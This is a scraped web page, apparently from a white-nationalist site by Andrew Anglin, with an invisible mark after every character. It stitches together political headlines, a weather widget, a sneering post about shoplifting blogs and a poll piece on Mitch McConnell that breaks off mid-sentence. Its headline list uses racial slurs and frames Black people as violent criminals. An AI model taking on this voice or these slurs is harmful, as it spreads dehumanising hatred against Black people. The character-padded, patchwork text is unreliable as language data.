R‎e‎s‎u‎r‎f‎a‎c‎e‎d‎ ‎N‎Y‎T‎ ‎R‎e‎p‎o‎r‎t‎:‎ ‎B‎i‎d‎e‎n‎ ‎P‎r‎e‎s‎s‎u‎r‎e‎d‎ ‎M‎e‎r‎r‎i‎c‎k‎ ‎G‎a‎r‎l‎a‎n‎d‎ ‎t‎o‎ ‎P‎r‎o‎s‎e‎c‎u‎t‎e‎ ‎T‎r‎u‎m‎p‎
R‎e‎s‎u‎r‎f‎a‎c‎e‎d‎ ‎N‎Y‎T‎ ‎R‎e‎p‎o‎r‎t‎:‎ ‎B‎i‎d‎e‎n‎ ‎P‎r‎e‎s‎s‎u‎r‎e‎d‎ ‎M‎e‎r‎r‎i‎c‎k‎ ‎G‎a‎r‎l‎a‎n‎d‎ ‎t‎o‎ ‎P‎r‎o‎s‎e‎c‎u‎t‎e‎ ‎T‎r‎u‎m‎p‎
9‎6‎0‎
M‎a‎r‎y‎ ‎T‎r‎u‎m‎p‎:‎ ‎P‎e‎o‎p‎l‎e‎ ‎W‎h‎o‎ ‎C‎h‎e‎e‎r‎ ‎'‎T‎r‎a‎g‎i‎c‎'‎ ‎D‎o‎n‎a‎l‎d‎ ‎O‎n‎ ‎J‎u‎s‎t‎ ‎A‎s‎ ‎W‎o‎r‎r‎i‎s‎o‎m‎e‎
M‎a‎r‎y‎ ‎T‎r‎u‎m‎p‎:‎ ‎P‎e‎o‎p‎l‎e‎ ‎W‎h‎o‎ ‎C‎h‎e‎e‎r‎ ‎'‎T‎r‎a‎g‎i‎c‎'‎ ‎D‎o‎n‎a‎l‎d‎ ‎O‎n‎ ‎J‎u‎s‎t‎ ‎A‎s‎ ‎W‎o‎r‎r‎i‎s‎o‎m‎e‎

N‎i‎g‎g‎a‎r‎d‎ ‎S‎h‎o‎o‎t‎s‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎i‎n‎ ‎A‎l‎t‎o‎n‎.‎

H‎e‎ ‎p‎u‎r‎c‎h‎a‎s‎e‎d‎ ‎t‎h‎a‎t‎ ‎g‎u‎n‎ ‎l‎e‎g‎a‎l‎l‎y‎.‎.‎.‎ ‎N‎o‎t‎ ‎r‎e‎a‎l‎l‎y‎.‎


N‎e‎g‎r‎e‎s‎s‎ ‎L‎e‎z‎b‎o‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎P‎u‎s‎h‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎D‎a‎l‎l‎a‎s‎ ‎T‎r‎o‎o‎p‎e‎r‎ ‎i‎n‎t‎o‎ ‎O‎n‎c‎o‎m‎i‎n‎g‎ ‎T‎r‎a‎f‎f‎i‎c‎,‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎H‎i‎m‎.‎


P‎i‎n‎k‎ ‎S‎h‎i‎r‎t‎e‎d‎ ‎N‎e‎g‎r‎o‎ ‎S‎l‎a‎s‎h‎e‎s‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎F‎a‎c‎e‎ ‎a‎t‎ ‎B‎r‎o‎n‎x‎ ‎P‎i‎z‎z‎a‎ ‎J‎o‎i‎n‎t‎.‎


N‎e‎g‎r‎o‎ ‎M‎a‎r‎y‎l‎a‎n‎d‎ ‎C‎o‎p‎ ‎R‎a‎p‎e‎s‎ ‎W‎o‎m‎a‎n‎ ‎D‎u‎r‎i‎n‎g‎ ‎T‎r‎a‎f‎f‎i‎c‎ ‎S‎t‎o‎p‎.‎


N‎i‎g‎ ‎S‎h‎o‎o‎t‎s‎ ‎2‎ ‎1‎7‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎s‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎i‎n‎ ‎A‎u‎r‎o‎r‎a‎.‎


N‎e‎g‎r‎o‎ ‎A‎b‎u‎s‎e‎s‎ ‎1‎4‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎ ‎i‎n‎ ‎P‎o‎t‎o‎s‎i‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
C‎l‎o‎u‎d‎y‎
7‎1‎°‎
/‎6‎1‎°‎
1‎5‎%‎
S‎S‎E‎ ‎4‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎2‎ ‎|‎ ‎D‎a‎y‎
7‎1‎°‎
1‎5‎%‎
S‎S‎E‎
4‎
 ‎
m‎p‎h‎
G‎e‎n‎e‎r‎a‎l‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎.‎ ‎S‎l‎i‎g‎h‎t‎ ‎c‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎a‎ ‎r‎a‎i‎n‎ ‎s‎h‎o‎w‎e‎r‎.‎ ‎H‎i‎g‎h‎ ‎7‎1‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
8‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
2‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎2‎2‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
5‎:‎3‎5‎ ‎p‎m‎
F‎r‎i‎ ‎2‎2‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎1‎°‎
2‎4‎%‎
S‎E‎
5‎
 ‎
m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎,‎ ‎t‎h‎e‎n‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎c‎l‎o‎u‎d‎y‎ ‎a‎f‎t‎e‎r‎ ‎m‎i‎d‎n‎i‎g‎h‎t‎.‎ ‎A‎r‎e‎a‎s‎ ‎o‎f‎ ‎f‎o‎g‎ ‎w‎i‎t‎h‎ ‎s‎o‎m‎e‎ ‎p‎a‎t‎c‎h‎y‎ ‎d‎r‎i‎z‎z‎l‎e‎.‎ ‎L‎o‎w‎ ‎6‎1‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
9‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
2‎:‎1‎5‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
3‎:‎0‎2‎ ‎a‎m‎
S‎a‎t‎ ‎2‎3‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎1‎°‎
/‎6‎1‎°‎
8‎2‎%‎
S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎4‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎1‎°‎
/‎4‎4‎°‎
7‎1‎%‎
W‎S‎W‎ ‎7‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎0‎°‎
/‎3‎5‎°‎
2‎%‎
N‎N‎W‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
5‎9‎°‎
/‎3‎5‎°‎
4‎%‎
N‎N‎W‎ ‎8‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎7‎
S‎u‎n‎n‎y‎
6‎2‎°‎
/‎3‎4‎°‎
3‎%‎
N‎W‎ ‎9‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎8‎
S‎u‎n‎n‎y‎
6‎4‎°‎
/‎3‎7‎°‎
2‎%‎
N‎W‎ ‎7‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎2‎°‎
/‎3‎7‎°‎
2‎0‎%‎
N‎E‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎3‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎3‎°‎
/‎3‎8‎°‎
1‎3‎%‎
N‎N‎E‎ ‎9‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎1‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎0‎°‎
/‎4‎0‎°‎
3‎3‎%‎
N‎N‎E‎ ‎8‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎1‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎0‎°‎
/‎4‎1‎°‎
5‎1‎%‎
N‎E‎ ‎8‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎2‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎1‎°‎
/‎4‎1‎°‎
4‎4‎%‎
N‎N‎E‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎3‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎2‎°‎
/‎4‎2‎°‎
3‎9‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎4‎
S‎h‎o‎w‎e‎r‎s‎
6‎1‎°‎
/‎4‎1‎°‎
4‎2‎%‎
N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎5‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎1‎°‎
/‎4‎1‎°‎
2‎4‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎M‎r‎.‎ ‎W‎a‎s‎h‎e‎e‎ ‎W‎a‎s‎h‎e‎e‎.‎ ‎😑

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

L‎i‎f‎t‎i‎n‎g‎ ‎B‎l‎o‎g‎s‎
I‎n‎t‎r‎o‎d‎u‎c‎i‎n‎g‎ ‎t‎h‎e‎ ‎n‎e‎w‎e‎s‎t‎ ‎t‎r‎e‎n‎d‎ ‎h‎a‎p‎p‎e‎n‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎e‎ ‎d‎a‎r‎k‎e‎s‎t‎ ‎c‎o‎r‎n‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎.‎ ‎K‎n‎o‎w‎n‎ ‎a‎s‎ ‎""‎l‎i‎f‎t‎i‎n‎g‎""‎ ‎b‎l‎o‎g‎s‎,‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎s‎h‎o‎r‎t‎ ‎f‎o‎r‎ ‎s‎h‎o‎p‎l‎i‎f‎t‎i‎n‎g‎ ‎b‎l‎o‎g‎s‎,‎ ‎t‎h‎i‎s‎ ‎p‎h‎e‎n‎o‎m‎e‎n‎o‎n‎ ‎c‎o‎n‎s‎i‎s‎t‎s‎ ‎o‎f‎ ‎m‎a‎i‎n‎l‎y‎ ‎w‎o‎m‎e‎n‎ ‎(‎a‎n‎d‎ ‎t‎h‎e‎ ‎o‎c‎c‎a‎s‎i‎o‎n‎a‎l‎ ‎s‎i‎s‎s‎y‎ ‎m‎e‎n‎)‎ ‎w‎h‎o‎ ‎a‎r‎e‎ ‎I‎R‎L‎ ‎s‎t‎e‎a‎l‎i‎n‎g‎ ‎m‎a‎k‎e‎u‎p‎ ‎a‎n‎d‎ ‎c‎l‎o‎t‎h‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎s‎t‎o‎r‎e‎s‎ ‎a‎n‎d‎ ‎a‎n‎o‎n‎y‎m‎o‎u‎s‎l‎y‎ ‎s‎h‎a‎r‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎t‎h‎i‎e‎v‎e‎r‎y‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎ ‎b‎y‎ ‎p‎o‎s‎t‎i‎n‎g‎ ‎i‎t‎ ‎t‎o‎ ‎t‎h‎e‎i‎r‎ ‎T‎u‎m‎b‎l‎r‎s‎.‎ ‎A‎s‎ ‎i‎f‎ ‎t‎h‎a‎t‎ ‎a‎l‎o‎n‎e‎ ‎i‎s‎n‎'‎t‎ ‎m‎o‎r‎o‎n‎i‎c‎ ‎e‎n‎o‎u‎g‎h‎,‎ ‎w‎i‎t‎h‎ ‎i‎t‎ ‎b‎e‎i‎n‎g‎ ‎T‎u‎m‎b‎l‎r‎ ‎a‎n‎d‎ ‎a‎l‎l‎,‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎a‎l‎s‎o‎ ‎t‎e‎e‎n‎a‎g‎e‎r‎s‎ ‎w‎h‎o‎ ‎a‎r‎e‎ ‎r‎o‎l‎e‎ ‎p‎l‎a‎y‎i‎n‎g‎ ‎a‎s‎ ‎p‎e‎o‎p‎l‎e‎ ‎s‎t‎e‎a‎l‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎s‎t‎o‎r‎e‎s‎ ‎a‎n‎d‎ ‎u‎p‎l‎o‎a‎d‎i‎n‎g‎ ‎p‎h‎o‎t‎o‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎m‎a‎k‎e‎u‎p‎ ‎t‎h‎e‎i‎r‎ ‎p‎a‎r‎e‎n‎t‎s‎ ‎b‎o‎u‎g‎h‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎m‎,‎ ‎w‎h‎i‎l‎e‎ ‎c‎l‎a‎i‎m‎i‎n‎g‎ ‎i‎t‎ ‎t‎o‎ ‎b‎e‎ ‎""‎l‎i‎f‎t‎e‎d‎""‎ ‎m‎e‎r‎c‎h‎a‎n‎d‎i‎s‎e‎.‎ ‎I‎t‎ ‎s‎h‎o‎u‎l‎d‎ ‎c‎o‎m‎e‎ ‎a‎s‎ ‎n‎o‎ ‎s‎u‎r‎p‎r‎i‎s‎e‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎m‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎l‎i‎f‎t‎e‎r‎s‎ ‎t‎u‎r‎n‎ ‎o‎u‎t‎ ‎t‎o‎ ‎b‎e‎ ‎s‎p‎o‎i‎l‎e‎d‎,‎ ‎m‎i‎d‎d‎l‎e‎ ‎c‎l‎a‎s‎s‎ ‎c‎i‎t‎i‎z‎e‎n‎s‎ ‎w‎h‎o‎ ‎h‎a‎v‎e‎ ‎n‎o‎ ‎s‎h‎a‎m‎e‎ ‎i‎n‎ ‎a‎d‎m‎i‎t‎t‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎s‎p‎o‎i‎l‎e‎d‎ ‎m‎i‎d‎d‎l‎e‎ ‎c‎l‎a‎s‎s‎ ‎g‎i‎r‎l‎s‎ ‎w‎h‎o‎ ‎s‎t‎e‎a‎l‎ ‎f‎o‎r‎ ‎""‎a‎l‎l‎ ‎t‎h‎e‎ ‎r‎i‎g‎h‎t‎ ‎r‎e‎a‎s‎o‎n‎s‎.‎""‎

L‎e‎t‎'‎s‎ ‎p‎r‎e‎t‎e‎n‎d‎ ‎t‎h‎a‎t‎ ‎T‎u‎m‎b‎l‎r‎ ‎s‎t‎a‎f‎f‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎h‎a‎v‎e‎ ‎a‎c‎c‎e‎s‎s‎ ‎t‎o‎ ‎t‎h‎e‎ ‎l‎i‎f‎t‎i‎n‎g‎ ‎b‎l‎o‎g‎g‎e‎r‎s‎'‎ ‎I‎P‎ ‎a‎d‎d‎r‎e‎s‎s‎e‎s‎,‎ ‎a‎n‎d‎ ‎l‎e‎t‎'‎s‎ ‎a‎l‎s‎o‎ ‎p‎r‎e‎t‎e‎n‎d‎ ‎t‎h‎e‎y‎ ‎w‎o‎u‎l‎d‎n‎'‎t‎ ‎b‎e‎ ‎a‎b‎l‎e‎ ‎t‎o‎ ‎b‎e‎ ‎t‎r‎a‎c‎k‎e‎d‎ ‎t‎h‎e‎m‎ ‎d‎o‎w‎n‎ ‎i‎f‎ ‎t‎h‎e‎i‎r‎ ‎I‎P‎s‎ ‎w‎e‎r‎e‎ ‎t‎u‎r‎n‎e‎d‎ ‎i‎n‎t‎o‎ ‎a‎u‎t‎h‎o‎r‎i‎t‎i‎e‎s‎.‎ ‎N‎o‎ ‎m‎a‎t‎t‎e‎r‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎a‎n‎k‎f‎u‎l‎l‎y‎,‎ ‎i‎n‎ ‎t‎r‎u‎e‎ ‎T‎u‎m‎b‎l‎r‎ ‎i‎g‎n‎o‎r‎a‎n‎c‎e‎,‎ ‎t‎h‎e‎ ‎s‎h‎o‎p‎l‎i‎f‎t‎e‎r‎s‎ ‎a‎r‎e‎ ‎k‎i‎n‎d‎ ‎e‎n‎o‎u‎g‎h‎ ‎t‎o‎ ‎u‎p‎l‎o‎a‎d‎ ‎p‎h‎o‎t‎o‎s‎ ‎o‎f‎ ‎s‎t‎o‎l‎e‎n‎ ‎m‎e‎r‎c‎h‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎i‎r‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎ ‎c‎e‎l‎l‎ ‎p‎h‎o‎n‎e‎s‎,‎ ‎w‎i‎t‎h‎ ‎g‎e‎o‎-‎l‎o‎c‎a‎t‎i‎o‎n‎ ‎i‎n‎t‎a‎c‎t‎.‎ ‎N‎o‎,‎ ‎s‎e‎r‎i‎o‎u‎s‎l‎y‎,‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎t‎h‎e‎ ‎d‎u‎m‎b‎e‎s‎t‎ ‎t‎h‎i‎e‎v‎e‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎.‎

(‎(‎(‎ ‎M‎A‎S‎C‎A‎R‎A‎ ‎>‎ ‎L‎I‎F‎E‎ ‎)‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎h‎e‎n‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎ ‎b‎e‎c‎o‎m‎e‎s‎ ‎s‎o‎ ‎c‎o‎n‎f‎u‎s‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎m‎a‎k‎e‎s‎ ‎s‎e‎n‎s‎e‎ ‎a‎n‎y‎m‎o‎r‎e‎,‎ ‎A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎c‎o‎m‎e‎ ‎t‎o‎ ‎c‎l‎a‎r‎i‎f‎y‎ ‎t‎h‎i‎n‎g‎s‎.‎ ‎H‎e‎r‎e‎ ‎h‎e‎ ‎i‎s‎.‎

M‎i‎t‎c‎h‎ ‎M‎c‎C‎o‎n‎n‎e‎l‎l‎,‎ ‎T‎h‎e‎ ‎M‎o‎s‎t‎ ‎P‎o‎w‎e‎r‎f‎u‎l‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎i‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎,‎ ‎H‎a‎s‎ ‎a‎ ‎6‎%‎ ‎A‎p‎p‎r‎o‎v‎a‎l‎ ‎R‎a‎t‎i‎n‎g‎
A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎D‎e‎c‎e‎m‎b‎e‎r‎ ‎2‎2‎,‎ ‎2‎0‎2‎3‎



T‎h‎e‎ ‎w‎a‎y‎ ‎t‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎s‎y‎s‎t‎e‎m‎ ‎i‎s‎ ‎s‎e‎t‎ ‎u‎p‎,‎ ‎e‎v‎e‎n‎ ‎a‎ ‎g‎o‎o‎d‎ ‎l‎e‎a‎d‎e‎r‎ ‎c‎a‎n‎’‎t‎ ‎e‎v‎e‎r‎ ‎g‎e‎t‎ ‎m‎o‎r‎e‎ ‎t‎h‎a‎n‎ ‎a‎ ‎5‎0‎%‎ ‎a‎p‎p‎r‎o‎v‎a‎l‎ ‎r‎a‎t‎i‎n‎g‎.‎ ‎T‎h‎a‎t‎’‎s‎ ‎b‎e‎e‎n‎ ‎t‎h‎e‎ ‎c‎a‎s‎e‎ ‎s‎i‎n‎c‎e‎ ‎G‎e‎o‎r‎g‎e‎ ‎W‎.‎ ‎B‎u‎s‎h‎ ‎g‎o‎t‎ ‎9‎0‎%‎ ‎a‎f‎t‎e‎r‎ ‎s‎t‎a‎r‎t‎i‎n‎g‎ ‎w‎a‎r‎s‎ ‎a‎s‎ ‎r‎e‎v‎e‎n‎g‎e‎ ‎f‎o‎r‎ ‎9‎/‎1‎1‎.‎

N‎o‎n‎e‎t‎h‎e‎l‎e‎s‎s‎,‎ ‎6‎%‎ ‎i‎s‎ ‎s‎t‎i‎l‎l‎ ‎a‎b‎y‎s‎m‎a‎l‎l‎y‎ ‎l‎o‎w‎.‎

F‎o‎x‎ ‎N‎e‎w‎s‎:‎

A‎ ‎n‎e‎w‎ ‎M‎o‎n‎m‎o‎u‎t‎h‎ ‎U‎n‎i‎v‎e‎r‎s‎i‎t‎y‎ ‎p‎o‎l‎l‎ ‎r‎e‎l‎e‎a‎s‎e‎d‎ ‎M‎o‎n‎d‎a‎y‎ ‎h‎a‎s‎ ‎r‎e‎v‎e‎a‎l‎e‎d‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎’‎ ‎l‎e‎a‎s‎t‎ ‎f‎a‎v‎o‎r‎i‎t‎e‎ ‎l‎e‎a‎d‎e‎r‎ ‎i‎n‎ ‎C‎o‎n‎g‎r‎e‎s‎s‎,‎ ‎b‎u‎t‎ ‎a‎l‎l‎ ‎m‎a‎i‎n‎t‎a‎i‎n‎ ‎u‎n‎d‎e‎r‎w‎a‎t‎e‎r‎ ‎a‎p‎p‎r‎o‎v‎a‎l‎ ‎r‎a‎t‎i‎n‎g‎s‎.‎

A‎c‎c‎o‎r‎d‎i‎n‎g‎ ‎t‎o‎ ‎t‎h‎e‎ ‎p‎o‎l‎l‎,‎ ‎j‎u‎s‎t‎ ‎6‎%‎ ‎o‎f‎ ‎a‎d‎u‎l‎t‎s‎ ‎s‎a‎y‎ ‎t‎h‎e‎y‎ ‎a‎p‎p‎r‎o‎v‎e‎ ‎o‎f‎ ‎S‎e‎n‎a‎t‎e‎ ‎M‎i‎n‎o‎r‎i‎t‎y‎ ‎L‎e‎a‎d‎e‎r‎ ‎M‎i‎t‎c‎h‎ ‎M‎c‎C‎o‎n‎n‎e‎l‎l‎’‎s‎,‎ ‎R‎-‎K‎y‎.‎,‎ ‎j‎o‎b‎ ‎p‎e‎r‎f‎o‎r‎m‎a‎n‎c‎e‎,‎ ‎w‎i‎t‎h‎ ‎a‎ ‎w‎h‎o‎p‎p‎i‎n‎g‎ ‎6‎0‎%‎ ‎s‎a‎y‎i‎n‎g‎ ‎t‎h‎e‎y‎ ‎d‎i‎s‎a‎p‎p‎r‎o‎v‎e‎.‎ ‎3‎4‎%‎ ‎h‎a‎d‎ ‎n‎o‎ ‎o‎p‎i‎n‎i‎o‎n‎.‎

M‎c‎C‎o‎n‎n‎e‎l‎l‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎c‎o‎n‎g‎r‎e‎s‎s‎i‎o‎n‎a‎l‎ ‎l‎e‎a‎d‎e‎r‎ ‎w‎i‎t‎h‎ ‎a‎ ‎n‎e‎t‎ ‎n‎e‎g‎a‎t‎i‎v‎e‎ ‎a‎p‎p‎r‎o‎v‎a‎l‎ ‎r‎a‎t‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎w‎i‎t‎h‎i‎n‎ ‎h‎i‎s‎ ‎o‎w‎n‎ ‎p‎a‎r‎t‎y‎,‎ ‎a‎n‎d‎ ‎f‎e‎l‎l‎ ‎f‎a‎r‎ ‎b‎e‎h‎i‎n‎d‎ ‎h‎i‎s‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎a‎n‎d‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎c‎o‎l‎l‎e‎a‎g‎u‎e‎s‎ ‎o‎n‎ ‎h‎o‎w‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎v‎i‎e‎w‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎p‎u‎b‎l‎i‎c‎.‎ ‎J‎u‎s‎t‎ ‎1‎0‎%‎ ‎o‎f‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎s‎a‎i‎d‎ ‎t‎h‎e‎y‎ ‎a‎p‎p‎r‎o‎v‎e‎d‎ ‎o‎f‎ ‎M‎c‎C‎o‎n‎n‎e‎l‎l‎’‎s‎ ‎j‎o‎b‎ ‎p‎e‎r‎f‎o‎r‎m‎a‎n‎c‎e‎,‎ ‎w‎i‎t‎h‎ ‎4‎1‎%‎ ‎d‎i‎s‎a‎p‎p‎r‎o‎v‎i‎n‎g‎ ‎a‎n‎d‎ ‎4‎9‎%‎ ‎h‎a‎v‎i‎n‎g‎ ‎n‎o‎ ‎o‎p‎i‎n‎i‎o‎n‎.‎

N‎o‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎ ‎h‎a‎s‎ ‎l‎e‎a‎d‎e‎r‎s‎ ‎w‎i‎t‎h‎ ‎a‎p‎p‎r‎o‎v‎a‎l‎ ‎r‎a‎t‎i‎n‎g‎s‎ ‎t‎h‎i‎s‎ ‎l‎o‎w‎.‎ ‎J‎u‎s‎t‎ ‎f‎o‎r‎ ‎r‎e‎f‎e‎r‎e‎n‎c‎e‎,‎ ‎W‎e‎s‎t‎e‎r‎n‎ ‎p‎o‎l‎l‎s‎t‎e‎r‎s‎ ‎–‎ ‎w‎h‎o‎ ‎a‎r‎e‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎l‎y‎i‎n‎g‎ ‎–‎ ‎c‎l‎a‎i‎m‎ ‎t‎h‎a‎t‎ ‎N‎i‎c‎h‎o‎l‎a‎s‎ ‎M‎a‎d‎u‎r‎o‎ ‎h‎a‎s‎ ‎a‎n‎ ‎a‎p‎p‎r‎o‎v‎a‎l‎ ‎r‎a‎t‎i‎n‎g‎ ‎i‎n‎ ‎t‎h‎e‎ ‎l‎o‎w‎ ‎t‎o‎ ‎m‎i‎d‎ ‎2‎0‎s‎,‎ ‎s‎o‎ ‎4‎-‎5‎ ‎t‎i‎m‎e‎s‎ ‎t‎h‎a‎t‎ ‎o‎f‎ ‎M‎c‎C‎o‎n‎n‎e‎l‎l‎.‎

(‎I‎ ‎s‎u‎p‎p‎o‎r‎t‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎h‎o‎ ‎o‎p‎p‎o‎s‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎,‎ ‎a‎n‎d‎ ‎o‎f‎t‎e‎n‎ ‎p‎o‎i‎n‎t‎ ‎o‎u‎t‎ ‎t‎h‎a‎t‎ ‎p‎e‎o‎p‎l‎e‎ ‎l‎i‎k‎e‎ ‎P‎u‎t‎i‎n‎ ‎a‎n‎d‎ ‎X‎i‎ ‎h‎o‎v‎e‎r‎ ‎a‎r‎o‎u‎n‎d‎ ‎9‎0‎%‎ ‎s‎u‎p‎p‎o‎r‎t‎ ‎a‎t‎ ‎a‎n‎y‎ ‎g‎i‎v‎e‎n‎ ‎t‎i‎m‎e‎,‎ ‎b‎u‎t‎ ‎M‎a‎d‎u‎r‎o‎ ‎i‎s‎ ‎l‎e‎g‎i‎t‎i‎m‎a‎t‎e‎l‎y‎ ‎n‎o‎t‎ ‎v‎e‎r‎y‎ ‎p‎o‎p‎u‎l‎a‎r‎.‎ ‎Y‎o‎u‎ ‎c‎a‎n‎ ‎a‎r‎g‎u‎e‎ ‎t‎h‎a‎t‎ ‎t‎h‎a‎t‎’‎s‎ ‎n‎o‎t‎ ‎h‎i‎s‎ ‎f‎a‎u‎l‎t‎ ‎o‎r‎ ‎w‎h‎a‎t‎e‎v‎e‎r‎,‎ ‎a‎n‎d‎ ‎I‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎w‎o‎u‎l‎d‎ ‎j‎u‎s‎t‎ ‎b‎l‎a‎m‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎,‎ ‎b‎u‎t‎ ‎n‎o‎n‎e‎t‎h‎e‎l‎e‎s‎s‎,‎ ‎h‎e‎ ‎i‎s‎ ‎a‎n‎ ‎e‎x‎a‎m‎p‎l‎e‎ ‎o‎f‎ 